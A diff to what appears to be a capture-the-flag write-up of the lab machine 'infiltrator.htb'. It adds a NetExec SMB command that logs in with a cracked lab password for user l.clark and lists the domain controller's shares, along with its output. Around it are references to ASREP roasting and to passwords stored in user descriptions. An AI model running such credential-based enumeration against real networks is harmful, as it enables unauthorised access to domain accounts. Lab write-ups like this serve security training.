@@ -176,7 +176,7 @@ Version: v1.0.3 (9dad6e1) - 10/04/26 - Ronnie Flathers @ropnop
 
 These users are valid
 
-# ASREP roasting
+# ASREP roasting leads to user c
 
 After getting some valid users ill try some ASREP roasting
 
@@ -204,6 +204,20 @@ SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:
 ```
 
 This user is compromised
+
+```python
+nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --shares  
+SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
+SMB         10.129.232.99   445    DC01             [*] Enumerated shares
+SMB         10.129.232.99   445    DC01             Share           Permissions     Remark
+SMB         10.129.232.99   445    DC01             -----           -----------     ------
+SMB         10.129.232.99   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.232.99   445    DC01             C$                              Default share
+SMB         10.129.232.99   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.232.99   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.232.99   445    DC01             SYSVOL          READ            Logon server share
+```
 
 # Password stored in user descriptions
 ```python
